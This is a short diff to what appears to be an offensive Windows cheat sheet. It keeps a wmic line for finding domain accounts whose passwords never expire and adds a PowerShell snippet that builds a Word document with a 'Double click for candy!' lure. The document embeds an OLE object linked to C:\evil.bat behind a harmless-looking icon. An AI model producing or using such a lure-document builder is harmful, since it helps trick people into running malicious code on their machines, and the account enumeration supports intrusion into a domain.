@@ -1,2 +1,10 @@
 Find all AD accounts whose password is set to never expire:
 wmic UserAccount where PasswordExpires=False get Name
+
+Plant an malicious OLE into a Word document:
+$word = New-Object -ComObject Word.Application
+$word.visible = $true
+$objDoc = $word.Documents.Add()
+$objSelection = $word.Selection
+$objSelection.TypeText("Double click for candy!")
+$objSelection.InlineShapes.AddOLEObject('','C:\evil.bat',$false,$true,'C:\candy.ico')
